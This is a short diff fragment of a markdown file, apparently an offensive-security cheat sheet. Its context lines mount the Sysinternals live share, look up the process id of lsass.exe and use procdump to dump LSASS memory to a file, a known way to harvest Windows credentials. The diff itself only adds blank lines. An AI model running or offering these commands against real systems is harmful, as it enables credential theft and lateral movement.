@@ -21,3 +21,5 @@ net use Z: https://live.sysinternals.com
 tasklist /fi "imagename eq lsass.exe" # Find lsass's pid
 Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
 ```
+
+
